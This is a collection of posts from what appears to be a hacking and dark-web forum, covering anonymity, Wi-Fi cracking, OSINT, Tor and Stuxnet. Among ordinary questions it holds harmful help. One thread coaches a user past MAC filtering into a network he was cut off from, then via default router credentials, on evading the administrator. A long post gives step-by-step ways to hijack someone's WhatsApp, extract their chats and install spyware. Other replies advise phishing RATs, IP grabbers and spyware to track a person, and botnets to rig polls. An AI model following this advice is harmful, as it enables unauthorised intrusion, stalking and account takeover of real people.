Seems like a good idea to get a machine dedicated solely for one "sensitive" job and when it is done, throw it away (after wiping hdd, smashing all hardware with a hammer, and burning it :D ).This might be costly, but there is this "raspberry pi" mini computer that is like 40 dollars, and seems it should get the work done for you (no need to edit videos or something heavy...). And I would burn 40 bucks just for making sure any time. 
I find the topic of online anonymity to be fascinating. I don't know much relative to some of you guys, but would I be ignorant to think I'm completely anonymous by using a VPN company that doesn't keep records, along with a spoofed MacAdress, and an OpenDNS (208.67.222.222 || 208.67.220.220 I think) to prevent DNS leaks?
I was concerned about my MAC address but I read in the TOR docs that the MAC is only used on the internal network. Why are you guys concerned about using the same MAC address?BTW, I did watch a couple of videos by Eli but he is incredibly difficult to listen to for the way he talks. 
@IceMt you are more secure like most wiuth that setup but there is NO complete anonymity.The VPN company could be a governement setup and you trust their statement of not keeping your records.You could have made a mistake paying for the vpn with bitcoinsyou could have downloaded an infected file somewhere etc.Surfing with such measures is ok but there is no 100% protection against everything.@DeadShardDrac The MAC address does identify the device you use to connect to the network and is hardwired into it. So if you read somewhere that you don't need to worry because the MAC address goes only as far as the router you drank the cool aid.Everything the ISP can see, can be seen by the Governments services.And the spooks can see much more.Check out the Stingray or Wardroning 
TOR?
@Overkill_gamer88 if TOR would be the only answer how did Silk Road 2 get busted?http://motherboard.vice.com/blog/everything-the-silk-road-founder-did-to-get-caughthttp://motherboard.vice.com/read/how-the-nsa-targets-tor-userswhen you are interesting enough to them they will find a way to get to you and the more clueless you are about the technology and their ttps the easier it is for them.  http://thehackernews.com/2014/01/spying-agencies-tracking-your-location_31.htmlI say it again, even if you do believe that Snowden is a fake (i have good reasons not to believe this) you should read absolutely everything he leaks.
I have lately been studying various ways of cracking WPA2 and other sources of wifi encryption and have been moderately successful using various techniques. I have run into a frustrating problem that has absolutely stumped me and what is worse is that I know the solution is probably extremely simple. I have access to a network's WPA2 passkey and I have confirmed that it is the correct passkey and can log in to the network but I wasn't able to access the internet at all. I deduced that the network was probably using a MAC address filtration which I thought would be easy to bypass.. This is the source of my frustration. I have gotten the MAC addresses that are verified by the network and I have tried to use various ways of spoofing the MAC address on either my computers or my mobile devices. I confirm that my MAC address is now being spoofed but as soon as I try to connect to the network I encounter a "Verification error" message which is odd considering the password is correct and will allow me to connect if I use my actual MAC address but as soon as I spoof the one that does have access I have no access at all. What am I missing? (Go easy on me.. Noob at your mercy) 00 Dr.Roberts 
Hi Dr.Roberts , maybe this is your problem?If you've spoofed someone else's MAC address and they're on the network with you chances are you've received the same IP address and are causing enough collisions that the all transferred frames are being dropped or are timing out.If 2 devices try to transmit at the same instant, the transmit collision is detected, and both devices wait a random (but short) period before trying to transmit againMost routers, bridges, switches, and other network devices all expect to send and receive packets in an order. When you jump in the middle and start trying to receive someone else's packets chaos ensues.UpdateFrom the sounds of it, trying to change your MAC address on the network to bypass filtering or create anonymity is definitely something the Administrator who is responsible for the network is on the look-out for. If an exploit happens on the network, the Administrator is responsible and will be involved in providing all of the necessary records for the connections being made to whoever is involved in the investigation. He will in fact have to spend some time gathering this information in the event of an issue, so since he's likely a busy person already he would have systems in place to reduce this risk. Some localities require that all traffic be documented.If you're using a random MAC address to try and change the identity of your machine then it's probably in the best interest of the IT guy that he does block anything that you could do on the network because from a digital paper-trail perspective it's nearly impossible for him to track you through his normal means via connection logs in the router. That being said he can use an app like Wireshark and capture the network frames you're transmitting over the network and make a match for user accounts and accesses so he can then determine that both MAC addresses are likely the same person if the same user account is used on the same website.Additionally a lot of the schools (Universities) that I've been at will have a network that uses something like WPA2-Enterprise for their WiFi access which in some cases will make it look like you've connected even though you haven't provided all of the proper credentials (it can sometimes look like an open network). School networks (I'm assuming college or high school) will provide you with a login where you can connect with your account to your appropriate shares and they can monitor your activities as required by law.source:https://security.stackexchange.com/questions/36285/cant-connect-to-network-after-spoofing-a-mac-address
Thanks for the prompt and detailed reply... From what I understand the administrator is simply using the access control of his router to manage devices that have access and those that do not. I used to have full access to the network until he began to filter Mac addresses where I presume I am now on the blocked devices listed. Would it be more effective to try to gain access to the access control and simply add my Mac address?Is there anyway the spoofing technique could be successful?Dr.Roberts 00
A little tip that might help A LOT to everyone else - Please, always name the thread according to the topic you wish to discuss, not according the feelings you have about it...e.g.: this thread could be named "WPA2 cracking - MAC address"This way,  others users will be able to find it using right keywords. Thanks ;)
@Dr.Roberts If you could gain admin rights you could easily fix that problem.Good point tobacco
Dr.Roberts can easily edit name of the thread, I believe. 
@tobacco Thanks for the heads up, just changed the name of the thread. So I am guessing that there is no work around to simply spoofing the MAC address and having that work? If so what are the most effective ways to gain access to the Access Control of the router? 
Well that was easier than I expected.. I simply tried a few generic user and password combinations that are usually preset and lo and behold I'm in. (I don't think it'll ever get easier than that.) Now that I'm in I want to carefully consider my next move. Whats the most effective way of allowing myself access without drawing suspicion? I was thinking rename my device to something that is already allowed to create confusion and lessen the chances of the administrator finding out. Thoughts? 00 Dr.Roberts 
Dr.Roberts i would recommend to study IDS from an administrator point of view. also study professional pen testing . have a look at the offensive security website.A step by step guide is very difficult as you might have missed a detection threat and your "guide" doesn't really see where he guides you.
@NJF Thanks for the heads up.. I've looked into pen testing quite a bit. Could you elaborate as to the specific application of pen testing in the context of this particular situation? 
well the choice of words wasn't the greatest i admit..you already penetrated ...without the need for testing lol. what i meant was if you approach professionally, then during the intelligence gathering phase, you probably would have stumbled over security measures of your target. Specifically the intrusion detection systems.... https://www.sans.org/reading-room/whitepapers/detection/intrusion-detection-evasion-attackers-burglar-alarm-1284In the link i send you earlier someone pointed out that you might be in a kind of honey trap network.While you connected to it the admin is gathering infos about you...i am not saying that that is the case but that it is possible.just be careful
@NJF duly noted thank you for the heads up. 
Dr.Roberts, do you have any good dictionaries ? I'm in search for some :)Cheers!
Hi All,   I've been researching infosec topics for a few years now. I have quite a few gaps in my knowledge as it's more of a hobby, which I would like to turn into a career at some point. I know how to work metasploit,veil-evasion,write in a few languages (c#,c\c++,asm,javascript,java typical undergrad cs classes). What I'm missing is a systematic approach to exploitation. Any new guy can take code from exploitdb and launch it but in a red-test or similar, most of those don't work as patching gets aggressive (or does it? I have very limited experience). Is there a more up-to-date site for exploits or is finding 0day stuff so easy (though not for me) that they can sit on these exploits and launch them when they need them? Every now and then I sit down and fuzz odd software for fun in hopes of finding a vulnerability somewhere but never do, especially as aslr and dep make it incredibly difficult (I know ROP addresses this but I haven't had enough experience yet with it.) So to get to my intended question, how do you guys deploy your RATs or backdoors? Is it as simple as social engineering somebody into downloading an exe and getting lucky with mass e-mail or is it another level I'm just not at yet? Crit0
I'm happy for you if you find the Social Engineering easy eheh, i'm a SE tester and i spend 1/2 months only for the pretext, but i never fail!!!eheh.However,depends, if you have the possibility, infect the pc manually, infiltrating, if you must attack from remote, of course the Emails attack it's the best and fast method for contact the victim for infect.Maybe, it's better phones nowdays,emails are a little protected now.Find all the information you need, write YOUR CODE and encrypt it for antivirus bypass, create your pretext and send.
Hi, someone know a OSINT tool for a general information Gathering (of people also) like Maltego but Open Source?, Maltego if you learn how to use in deep it's fantastic and when well set with many extensios is very powerful but i prefer a pure open source (of the code) tool.If someone know a good OSINT tool write, i'm always interested in new tools!!!Thanks a lot.
Hi BlackArchSE,   I'm by no means a 133t h4x0r but in my own r&d i use many different osint tools. By your choice I'm guessing you are looking for all-in-one or a workflow like application. A quick google search turned up Paterva. It is open source as per your requirements. I might have a look at that.edit:I apologize, paterva IS maltego. I stick to maltego usually anyways, I'll keep looking. 
Ah! Dradis, which used to be included with backtrack/kali. Try that?
Did you ever had a look at shodan and oryon?
Yes i've already tested these.Now i've found a very good Email Scraper, you just insert any names/phrases/domains and it refer back any emails associates. It names google-EmailScraper, you can find it on Github.
So for reasons that I wish not to share (not malicious), I am wondering how I can gain information about somebody starting with emails that they send me. They're using gmail and I'm also fairly positive they aren't using proxies, or really any sort of protection. I figured I might be able to start with gleaning their IP address, and then going from there. Any information is helpful. Thanks!D3faultUs3r
Not sure about GMail but Hotmail used to include the source IP in the mail headers. You should realize that any e-mail message is just a plaintext block of data that you can load into an editor like notepad. When you do that, it shows you the entire message including technical headers. These headers are interesting because they indicate much about the technology used and the path traveled by the message across the internet. Hotmail used to include a header called X-Originating-IP, which was always very useful. Maybe GMail uses something similar that you can use.I've also found it useful to trick senders into sending me any kind of MS Office document they create on their PC. These documents contain boatloads of hidden metadata which tell a lot about the person's identity.
Yea, Gmail does include originating IP ("google.com: domain of email@hotmail.com designates *IP ADDRESS HERE* as permitted sender"). So apparently this person is using hotmail. I have the IP, and I've tracked its location (which isn't terribly accurate), but I'm not sure where to go from there. 
If you want be sure of the IP address, send to the target a ipgrabber with a persuasive message (social Engineering),or,even with SE ways, create a new email and contact the target with a pretext (use all the time for study your attack) and try to take all the informations that you need,or send a hidden spyware.If you can find a photo, you can track the position if the GPS it's anabled on the device,or track from the GSM, but for this you must use a professional analysis forensic tool.I suggest you to try with Social Engineering,1 or 2 months for prepare the pretext and....attack!!!
I've heard rumors of one of those, you know, websites (I'm talking about the Red Room here) that has an altered form of the Tor Browser that allows a person to access the "Shadow Web" (Ohhhhhhh how scary (Sarcasm)). Don't worry, I'm not after abuse videos. I just want to know if anyone has any knowledge of this.
Doesn't exist. No one cares.
You know what Korruptor, it takes one thing to say that it doesn't exist, I can handle that. But when you change my threads title to try and silence me, you are no worse than a powerful, evil, fascist dictator. This forum is ANTI-CENSORSHIP.
But... There is a BIG but. I don't know who you are, what your thinking or why your doing this.
I don't know, but I would be interested to see what's there.
I believe that this video briefly goes into it (CLEAR NET WARNING!) https://www.youtube.com/watch?v=S7jd1gRPAG4 or Part 2 https://www.youtube.com/watch?v=nEkHh3h4dxk
Danhk, if your feeling adventurous enough, I found a link to the altered Tor Browser. Approach this with great caution. http://vqu4mm5lcjmlqohh.onion/
WARNING! This sounds like a lot like a scam... JollyFool, I'd like to know how you know about a website that came on not even 24 hours ago.
I only knew about this website through rumors, that's why I started this thread to see if anyone could validate the rumors. Then, while browsing the different wikis trying to find any links related to it, (http://hwikis25cffertqe.onion/index.php?title=Main_Page) I found the site. I didn't use any spider services like Harry71 so I didn't know how long it had been up.
Hi guys.What email platform does everyone use? I'm don't like having anything on my computer so any advice would be welcome. Generic 
Here are some.
Zyx thanks this is great I should have looked through the rest of the exchange first. On another note what are your thoughts on IRC?
Some more.OnionMailBitmessage E-Mail GatewaySIGAINTMailtorLelantosMail2TorOnion Mail
Here's the thread about our IRC channel.
Why cant I post email from Mail2Tor to clearnet mail provider? 
Hi,i suggest you to use Ruggedinbox.com,it's a offshore service and you can use squirrelmail who don't require javascript.There is a Tor Hidden service with SSL for contact in the deepweb but should work for clearnet also.You can choose many ways.Other services are listed by smst. 
@tobacco -maybe it's fault of Blacklists. Gmail and other service may blocks the darknet traffic, it's a mine hypothesis.
Anyone have any ways to hack the number of followers on social media apps or websites like Instagram, Facebook or twitter? Could you share links or methods. Thank you!
its not possible to hack the ''Number'' but its possible to get more followers by buying them or you can go the hard way with exchanging follows and likes an such here is example for instagram followers (clear web site) http://www.apkdad.com/get-followers-on-instagram-2-2-8/you can also find for facebook , twitter , youtube ..etc also you can go to the long way wich most people do is do follow for follow.p.s : you cant find any of these apps on the google play store but you can find them on the appstore , they were deleted 2 months ago from the google store
I think its possible to create a bot to make a bunch of accounts and then make one post, so the account is'nt deleted, then make it follow a bunch of other users randomly, and then yourself.
Yes, Facebook does that A LOT, but I'm not sure if you can do it. In my country there was a controverse with a company and every now and then on my newsfeed it would appear that some people liked the company's page. Literally they were showing everybody that their friends like the company so you would support them, most disgusting way of propaganda.
    1. MAC Spoofing     (i) Uninstall WhatsApp from your phone or device.     (ii) Obtain your target's phone. You'll need it for two different steps throughout the process, but this shouldn't take too long     (iii) Find your target's phone's Media Access Control (MAC) address. A MAC address is a unique identifier assigned to your phone or other device that essentially serves as its online identity. Find and write down your target's MAC address. It takes the form of six pairs of letters or numbers, separated by colons (01:23:45:67:89:ab).     * On an Android, find this in Settings ��� About phone ��� Status ��� Wi-Fi MAC address.    * On an iPhone, go to Settings ��� General ��� About ��� Wi-Fi Address.    * On a Windows phone, look in Settings ��� About ��� More info ��� MAC address.    * On a BlackBerry, go to Options ��� Device ��� Device and Status info ��� WLAN MAC.     If you find the MAC address as unavailable, turn on the 'WiFi' connectivity and then you'll get it instantly.     (iv) Find your MAC address using the instructions above. Backup your original MAC address as you would need to change it back to that after the "work" is done     (v) Change ("spoof") your phone's MAC address to that of your target. This will allow your phone to pass as your target's, letting you convince WhatsApp that you are your target when you log in.     * On an iPhone or other device, install a MAC spoofing app like MacDaddy X or WifiSpoof. Use that to change your MAC address.    * On Android, install BusyBox and the Terminal Emulator (apps available for free on Google Play). In the terminal, type "ip link show" to see a list of interfaces. Identify the one that has your MAC address -- for this example, we'll use the eth0 interface. In the terminal emulator, enter "ip link set eth0 address XX:XX:XX:XX:XX:XX" and "ip link set eth0 broadcast XX:XX:XX:XX:XX:XX", where eth0 is the interface you identified and XX:XX:XX:XX:XX:XX is your target's MAC address. To check that you've successfully changed your MAC address, enter "ip link show eth0."     (vi) Install and configure WhatsApp on your phone. Enter your target's phone number to set up WhatsApp rather than your own. This will allow you to receive their messages and send messages from their account.     (vii) Get the confirmation code from your target's phone. This code will be sent to their phone number as part of the WhatsApp configuration process. Access their phone one last time to get that verification code. Enter it into WhatsApp on your phone when prompted, and you're all ready to go.     * If you don't want your target to find out about your spoofing, make sure to delete the confirmation code from their phone before they can see it.     {Note: This step is restricted to areas where MAC spoofing is known by the authorities and this has been taken as a step for all types of installations and reinstallations of Whatsapp Application}     (viii) When you no longer need to access your target's WhatsApp account, change your MAC address back to what it was. Repeat the instructions to change it, but this time change it to your original address rather than your target's. This will restore your phone to how it was originally, which will ensure that there are no future problems with Internet usage or connectivity.     2. Whatsapp Backup Database Access     (i) Find the WhatsApp database backup file and copy it on your computer.     * For non-rooted Android devices:    Quote:    /sdcard/WhatsApp/Databases/msgstore.db.crypt    /phone/WhatsApp/Databases/msgstore.db.crypt     * For rooted Android devices:    Quote:    /data/data/com.whatsapp/databases/msgstore.db    /data/data/com.whatsapp/databases/wa.db     If you extract the WhatsApp databse from msgstore.db or wa.db files, the name and phone number of a WhatsApp contact will also be displayed in the extracted file.    ***Android users directly refer from step (i) to step (iv)***      * If you use WhatsApp on iPhone, the WhatsApp backup file is,    net.whatsapp.WhatsApp/Documents/ChatStorage.sqlite     If you don�۪t see this file, you can create it manually. To create a backup of your WhatsApp data on your iPhone, first connect it to your computer and start iTunes, and create a full unencrypted backup of your iPhone data.     (ii) Download and install the iPhone Backup Extractor. (http://cur.lv/k550d) Run the program and select the iPhone backup file your just created. Click on ���Expert Mode�۪ in bottom right corner.     (iii)Click Application, find and select net.WhatsApp.WhatsApp and then click on Extract Selected.     *In the extracted data, the file ChatStorage.sqlite contains all your WhatsApp data backup. After the .sqlite file is extracted, you will get the crypted files.     (iv) Now download WhatsApp Xtract package (http://cur.lv/k550e) on your computer and extract it.     (v) Now, download and install Python (http://cur.lv/k550f) programming language environment on your computer. Download the 32bit (x86) version (nevertheless of your computer being 32 or 64), and install it {64 bit has several errors that can interfere}     * Do not be afraid. You do not need to know programming to operate Python. You just need to use a few commands to extract the Whatsapp backup file.     (vi) Open the extracted folder of Whataspp Xtract Package. Find a file named "install pyCrypto.bat. Right-click the file and "run as administrator".     * This file will execute the following Python command:    Quote:    pypm install pycrypto     This command will automatically install the pycrypto library on your computer - which will be used to decrypt Whatsapp backup data.     (vii) Now in the same folder, run either whatsapp_xtract_iphone.bat, whatsapp_xtract_android_crypted.bat or whatsapp_xtract_android.bat depending upon the backup file you used. To run any of these files, simply right click on it and click run as administrator, just like above.     Another alternative method here is to run whatsapp_xtract_console.bat and specify the WhatsApp backup file manually     Quote:    /* For Android DB: */    python whatsapp_xtract.py -i msgstore.db -w wa.db     /* if wa.db is unavailable */    python whatsapp_xtract.py -i msgstore.db     /*for crypted db*/    python whatsapp_xtract.py -i msgstore.db.crypt     /*For iPhone DB*/    python whatsapp_xtract.py -i ChatStorage.sqlite     After the execution of the command will be completed, all Whatsapp backup data that you hauled into your computer will be decrypted and will be displayed on your default browser.     3. Whatsapp API and Reverse Engineering     WhatsAPI [ http://cur.lv/k550g ] is available as an XMPP platform for hands-on access for Whatsapp. WhatsApp uses customized XMPP server with proprietary extensions, named internally as FunXMPP.     WhatsApp Authentication / Login Mechanism: Just like any other XMPP, WhatsApp uses jabber id and password to login. The password is hashed, stored in servers upon account creation and used transparently everytime the client connects the server.     On Android, the password is a md5 hash of the reversed IMEI number:    Quote:    $imei = "112222223333334"; // example IMEI    $androidWhatsAppPassword = md5(strrev($imei)); // reverse IMEI and calculate md5 hash     On iOS, the password is generated from the devices WLAN MAC address:    Quote:    $wlanMAC = "AA:BB:CC:DD:EE:FF"; // example WLAN MAC address    $iphoneWhatsAppPassword = md5($wlanMAC.$wlanMAC); // calculate md5 hash using the MAC address twice     Both IMEI and MAC address are easily retrievable from devices if you have physical access to it. MAC address is much easier to capture as you can sniff on the wireless network to which iOS device is connected.     The Jabber ID is a concatenation between your country�۪s code and mobile number.     Initial login uses Digest Access Authentication. You can try this for yourself:     Quote:    http://cur.lv/k550h     Quote:    $countrycode = the country calling code    $phonenumber = the users phone number (without the country calling code)    $password = see above, for iPhone use md5($wlanMAC.$wlanMAC), for Android use e md5(strrev($imei))     The response you would receive would be in XML, containing messages designated for your phone.      Text Messages: Messages are basically sent as TCP packets, following WhatsApp�۪s own format (unlike what�۪s defined in XMPP RFCs).     Photos, Videos and Audio files shared with WhatsApp contacts are HTTP-uploaded to a server before being sent to the recipient(s) along with Base64 thumbnail of media file (if applicable) along with the generated HTTP link as the message body.     Another vital piece of information:    Quote:    ~blank line~    <?xml version="1.0" encoding="UTF-8"?>    <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://cur.lv/k550i">    <plist version="1.0">    <array>    <dict>    <key>P</key>    <string>1234567890</string>    <key>T</key>    <integer>10817</integer>    <key>S</key>    <string>Your Status Here</string>    <key>JID</key>    <string>23xxxxxxxxx</string>    <key>NP</key>    <true/>    </dict>    </array>    </plist>    ~blank line~     Here, the key P refers to the user's phone number    T seems to be uptime    S is the status message    JID is the Jabber ID    NP has not been confirmed yet.     This is an official privacy leak from Whatsapp.     Reverse Engineering with IMEI and MAC addresses can create a JID for login onto WhatsAPI to access Whatsapp Chats.     4. Spyware     This is no-doubt, the easiest method to sniff the chat logs of a person. Android RATs can also substitute the use of Spyware in this case     (i) Choose an app or program to use.    * There are several premium paid programs like mSpy, Spymaster Pro, Copy9 and Mobile Spy which can assure premium spy service     * There are also free applications for spying on other's phones. Children Tracker, Spy Video Recorder, and Secret Agent which can allow remote access to the victim's phone.     (ii) Buy/install your chosen application. Once you've made your purchase, follow the instructions to install the app. This will usually involve installing it on your phone or computer as well as on the phone that you'll be monitoring.     (iii) Set up the app and start tracking. Follow the app's instructions to make sure everything is set up properly so that you can view all the desired information. You should start receiving their WhatsApp messages, as well as any other information you've included.     5. Dead Method     This method was a popular way to sniff the Whatsapp Password without physical access to the client's phone.     As of August 2013, this method has died off, because Whatsapp traffic has stopped being shown on mitmproxy and SSLsplit - making this method a dead one. The new August 2013 update of the Whatsapp client requires the client software to check the certificate fingerprints, which makes password sniffing/forgery via proxies almost impossible.     Similarly, WhatsAPI was down on February 2014 due to DMCA infrigement but has been brought back online a few months ago.   6.Whatsapp sniffer (i am not sure if it still works)   basically this method is when your connected with the suspect on the same wifi it works by sniffing his data.    WARNING: clearnet link : http://www9.zippyshare.com/v/92769265/file.html   well all you have to do is to download the apk on your phone and sniff thats all,If you know any more working methods share , enjoy and dont be evil .
Hello.Asking if anyone know a method to scan android and ios devices for survelliance softwares.I know about the jailbroken iphone stuff, that it is much easier to get spyware on it, however I do not know how to detect it. Not to mention I do not really know anything about android systems..Any help would be appreciated.Thanks.Omgzilla
apktool for android; and iPBA for iphones; doulci if you need to remove a lock.Another method would be using an SSH server forced upon the phone; just throwin' ideas out.Enjoy, and hope to hear back soon.
How would one go about recovering information; at least with the most ease. I've been thinking of using Social Engineering techniques; but that is what I want to do last, as it's lots of work.Any help would be appreciated; ty.
Or are there multiple programs and protocols to access this area?Are there other forms of the dark web or levels?As in, .onion is what were using, is there something else?
This address is within the Tor network, thus only accessible through Tor itself (do not confuse "address" with "server"). Most well-known ones are Tor, I2P and Freenet. There are other types of deep webs, such as pages accessible only through specific queries. This is a question that belongs in a web search, although it has been answered here before (not gonna go dig for the thread).
So there isn't other forms for .onion addresses? Those are indeed everything else that is not the clearnet?
negative! I2P have .i2p freenet also have its own system... just like (I guess) all other form of deepweb.
You must have been thrown into a washing machine on spin cycle...The terminolog you are using will only confuse you, and others. That is why the terminology was spammed across the internet, is to trigger remote neural monitoring events, and dilute the knowledge of what  networking  &  protocols  really are.
I understand that networking is how, and what, you link different computers together with devices and that protocols are rules on how all of that happens.Where did I misplace my wordding?Also, what happens if neural monitoring happens?
Well, the (spam)terminology sets of alerts, and then they may target & attack you & others indiscriminately.So think ahead before you continue.
Using the term Neural implies some form of telepathic communication, are you referring to attacks in this nature?Or is it just a hacker term, and some computer is running scripts to find keywords that this group of people just don't want others to partake in, so they find out who submitted said keyword and attempt to hack into the persons computer/network/devices / send email spam?I just want to make sure what I'm going to be up against in case it happens.What programs do I need in order to connect to i2p areas as well as freenet areas?
@BlueFizz: A quick web search immediately yielded:- I2P download- Freenet downloadWhat Korruptor was referring to was the phrase "dark web or levels". An explanation as to how such phrases may be used is in my last post in this thread.
There is also Hyperboria Network (projectmeshnet.org).
Some simply create theory own VPN or internal networks to access shared information similar to for.
It also depends on what you mean by 'deepweb', as others have said, the main ways of connecting are TOR, I2P and Freenet, however there are other parts of the deepweb, and if you include the 'darknets', then it is impossible to know exactly how many there are as anyone could theoretically set up one. Then there are also rumors of the 'M-web' as it is being called on this site, it's impossible to know just how far the rabbit hole goes.
What's the M-web?

@communityWhat I'm doing is setting up a multi-boot system on a 3TB external drive. My computer has windows on it. What software would anyone recommend to partition the external drive? What multi-boot manager would anyone recommend? The OS's I am going to install will be Open Source. What OS's would you recommend? The complexity of the OS's doesn't matter I'm doing this to learn and expand my mind, so if I have to research your suggestions it will not bother me:) I'm also going to need Open Source security, anti-virus, malware, ...etc. Please write several options for all of these so your not telling me what your using. Any recommendations, questions, comments, or concerns will be greatly appreciated.Damn, that was way easier then typeing out my entire system and the software I was going to use.Thank You to everyone for your help.
Well, erm... you could use linux for dual or multibooting. Now, it depends how much knowledge you've got regarding linux OSs. If youve got some then go straight for Gentoo, which i believe its the best for this kind of job(see gentoo handbook or wiki), if not then i'd suggest you start from the basics, which it may be dual booting windows and Ubuntu
@dasnotexistThanks for your input, Windows and Ubuntu is where I started. Still working on the multiboot, having alot of trouble getting Kali to install properly.P.S.-Thanks for replying thought I would get more input.
Multi-booting from an external drive adds a ton of complexity which I doubt you'll need. Won't it do to run your experimental OS from a virtual machine within Windows? It'd be a heck of a lot easier to restore a fuckup if you can use VM snapshots and your main working environment won't be at risk. You could even simulate the whole multiboot setup within a single VM. Try VirtualBox from Oracle, it's free and does a great job for this kind of thing.
That was where I went after getting Windows and Ubuntu running then having trouble getting a third OS to work without problems. Thought using VM would limit functionality of the individual OS's. Maybe I just didn't read enough about VM's, since you brought up VM's and the snapshots I'll try setting up the VM's again think I still have the setup files in my downloads..... I'll post after I get the VM's running again. Thanks wasn't getting alot of input. :)
VM's are great.
Anyone else have some input ?
i just got one of those 27 in imac, and im a pc so is there anything i can do software wise that would be cool to test out. like maybe make a web server, or a renderer. I have no idea so tell me yours.
Anyone have any hacks for Odnoklassniki and VKontakte. There are some things I need to do and any information will help.
How to do it (besides brute force) and any useful modules?
There are some good books. Try Violent Python. A cookbook for hackers. 
@NollopA Links please?
I've searched in the surface web, if anyone's wondering. But what I'm looking for is a more detailed explanation of what an engine (such as unreal, frostbite, unity, etc...) is, how is it made, why, etc... The more details, the better. Thank you for reading. 
I was wondering if there is any way of hacking/deceiving an online voting poll which requieres a facebook account in order to vote?
1. Ask everybody you know to vote for what you want2. Hire some people who own botnets
If i was about to ask everybody to vote, I wouldnt be interested in hacking the bloody poll.Anyway, I think I've already found an answer, there are several php scripts that create gmail as well as facebook acounts.
Hey to everybody! In your experience, what is the number 1 computer programming code a first time beginner should learn to start hacking in your experience?
C, C++, x86 Assembler if you want to focus on computers, add java and arm assembler if you want to do something with android.
As I'm further developing my knowledge related to computers, I ask myself: Can I use this skills/knowledge in order to have a "good" career? By that I mean, could it provide a stable income over the years? Would it be increasingly boring/frustrating to the point it makes me regret that I've ever learned programming in the first place? What about the workplace? Overall, is there what are the pros/cons? I want to hear what you people think. Thanks. 
I recently got into mining Litecoin, and I already know how the mining works and what not, but I'm having a lot of trouble trying to find the mining software to install on my Linux (Debian based) machine (This is a computer, not a legit mining rig). I've tried my hand at installing cgminer and btgminer with all the correct repositories. Unfortunately, when I try on either of them they won't start.Can anyone help me with what I'm doing wrong currently? When it comes to mining the only thing I've gotten close to is installing the crypto miner on my phone to mine (though very little) at least BTC.Thanks!
Sorry to answer you months after you post the question, but I think you could find that information by doing a simple google search.
Hello, I have a question about reverse engineering. Many people who call themselves "hackers" talk about reverse engineering, by getting the source code of a program they can analyze it and understand how the system works so they can mimic it or improve it. Forgive my inexperience/ignorance, but how do I reach the source code of software that isn't open source?
You don't. Your definition of the concept of reverse engineering is slightly off. What "hackers" do when actually reverse engineering, is closely monitoring the behaviour of a system in order to discover the whole of its potentially many inputs and outputs and the way these are interrelated. By doing this, it's possible to determine the complete behaviour of a system without having access to its design or code, enabling you to create your own compatible implementation.It is generally possible to decompile closed source software, but the result of that is usually very difficult to read. During compilation of the original sources, the compiler and linker strip out almost all information that's useful to humans. Another "destructive" property of compilers is the fact that they optimize. A simple example of this would be the unrolling of loops. A programmer would write "do this action ten times", which an optimizing compiler in some cases could implement as "do action, do action, do action, do action, do action, do action, do action, do action, do action, do action" because in some cases the CPU can deliver the end result faster this way at the cost of a little bit of redundancy.A high-profile case of reverse engineering is the Samba project. It allows UNIX-like operating systems to share files using MS Windows' native protocols. Originally MS didn't provide any specifications at all for these protocols so the developers had to closely observe what Windows systems were doing amongst themselves on a network in order to reimplement identical behaviour. This provided a working implementation in the end, but it's very difficult to find all edge cases this way.
I see. Thank you Borax for the inforation and patience.
I was wondering if you could tell me the best programming language to make an anonymous operating system. I thought that it would be cool to make a completely anonymous OS.
C.. It'd be cool indeed, but it'd also be a monumentally huge undertaking before you have anything useful. You're probably better served by building on top of something existing, like OpenBSD.
Tails Linux is pretty good you should check it out. 
Thanks everyone! Just wondering, how would you install Tails on top of Windows XP? I don't think that virtual box would keep me anonymous.

Sorry! iPad TOR app has some glitches with IE.
Ah, you again. Welcome back. :)Sad to see you're still chugging along on that old unsupported XP. That in and of itself is a huge risk, but you know that already. VirtualBox would, in fact, keep you much more anonymous than just bare-metal XP would. The host-OS, unless trojanized specifically to intercept VirtualBox's system calls (which is highly unlikely but not completely unthinkable), would know nothing of what's going on inside a VM. In your case, just a regular kid running XP from home, you'd be much better off running Tails inside VirtualBox than you would be browsing from XP directly.You could, of course, also run Tails straight of a CD/USB by booting your actual machine from that. It won't touch your hard drive. This way you'd be as safe as you're reasonably going to get.
Through Tails, could I acess my files off of my hard drive?
You shouldn't want to.. think about that. 
how about ransferring inportant ones to USB
Start here:http://en.wikipedia.org/wiki/Compartmentalization_%28information_security%29...but do read more. If you want security, you need to learn about this stuff. Cisco has some relevant certifications you could study the courseware for. Plonk this into a decent torrent client:magnet:?xt=urn:btih:CFA70764DC1A1A902BFB6B1296113EB410CDF053&dn=cisco+ccna+security+introduction+to+network+security&tr=udp%3A%2F%2Fglotorrents.com%3A6969%2Fannounce&tr=udp%3A%2F%2Fopen.demonii.com%3A1337Man.. I wish the internet was what it is today 30 years ago. All that free knowledge around every corner!
2nd link... is that a download link?
That's a magnet link. Torrent clients know what to do with it. Leads to a collection of video's for the Cisco CCNA Security certification program. Should teach you a bit about infosec.

Hello EveryoneI'm just wondering, if someone knows, where I can get the stuxnet source from. I just found a decompilated Verson which has random value names and is not readable. Is the real source public?I don't want to use it for bad tasks, just wondering how the programmed it.Greez and TIA
http://www.eset.com/us/resources/white-papers/Stuxnet_Under_the_Microscope.pdfthis is a very detailled overview of it onlybut you will not get the sourcecode for it easily, unless you know someone......And one person is not going to be able to adapt it; it took the best programming minds in a few nation states to write it.as you will know, it ran for many months totally undiscovered, and when it was discovered, most people in the programming community were at a total loss as to how it had been written as it was simply so complex and every single part of the code did something in a multi layered fashion which interacted intrinsically with every other part of the code.and that was only mark 1 of the programme...god only knows whats out there nowbut this is a very interesting startpoint
Stuxnet was clever but it wasn't *THAT* awesome really. Using a stolen key to sign a kernel driver isn't exactly genious-level programming.
the start point for the infection certainly was not clever .. ie the dumb human (or bribed insider) inserting a flash drive, but as Stuxnet goes to work, bypassing both the operating system�۪s  inherent security measures and any anti-virus software that may be present.  Upon interrogation by the OS, it presents itself as a legitimate auto-run file.  Legitimacy, is conferred by means of a digital certificate.  A digital certificate (or identity certificate) is an electronic cryptographic document used to prove identity or legitimacy.  The certificate includes information about a public cryptographic key, information about its owner's identity, and the digital signature of an entity that has verified the certificate's contents are correct.  If the signature is valid, and the person or system examining the certificate trusts the signer, then it is assumed that the public cryptographic key or software signed with that key is safe for use.Stuxnet proffers a stolen digital certificate to prove its trustworthiness.  Now vetted, the worm begins its own interrogation of the host system. :  Stuxnet confirms that the OS is a compatible version of Microsoft Windows and, if an anti-virus program is present, whether it is one that Stuxnet�۪s designers had previously compromised.  Upon receiving positive confirmation, Stuxnet downloads itself into the target computer.It drops two files into the computer�۪s memory.  One of the files requests a download of the main Stuxnet archive file, while the other sets about camouflaging Stuxnet�۪s presence using a 